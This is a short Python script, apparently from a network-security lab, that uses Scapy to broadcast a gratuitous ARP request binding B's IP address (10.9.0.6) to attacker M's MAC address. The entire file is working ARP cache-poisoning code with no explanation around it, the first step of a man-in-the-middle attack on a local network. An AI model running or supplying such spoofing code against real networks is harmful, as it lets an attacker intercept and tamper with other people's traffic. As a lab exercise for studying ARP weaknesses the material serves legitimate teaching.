#!/usr/bin/env python3
from scapy.all import *

E = Ether()
A = ARP()

E.dst = 'ff:ff:ff:ff:ff:ff'
A.op = 1	# 1 for ARP request; 2 for ARP reply
A.hwsrc = '02:42:0a:09:00:69'	# source MAC	M's MAC
A.psrc = '10.9.0.6'		# source IP	B's IP
A.hwdst = 'ff:ff:ff:ff:ff:ff'	# destination MAC	broadcast
A.pdst = '10.9.0.6'		# destination IP	B's IP

pkt = E/A
sendp(pkt)
